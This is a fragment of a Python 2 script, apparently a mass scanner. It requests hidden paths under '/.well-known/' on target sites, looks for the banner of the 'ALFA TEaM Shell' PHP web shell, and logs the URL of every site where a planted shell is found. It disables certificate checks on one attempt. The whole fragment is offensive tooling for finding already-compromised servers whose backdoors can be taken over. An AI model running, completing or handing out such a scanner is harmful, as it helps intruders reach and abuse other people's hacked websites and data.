...
def FourHundredThree(url):
    try:
        ...
        check = requests.get(url+'/.well-known/admin.php',headers=headers, allow_redirects=True,timeout=15)
        if 'ALFA TEaM Shell - v4.1-Tesla' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('ALFATEaMShell.txt', 'a').write(url + '/.well-known/admin.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/.well-known/acme-challenge/wp-signup.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'ALFA TEaM Shell - v4.1-Tesla' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('ALFATEaMShell.txt', 'a').write(url + '/.well-known/acme-challenge/wp-signup.php\n')
            else:
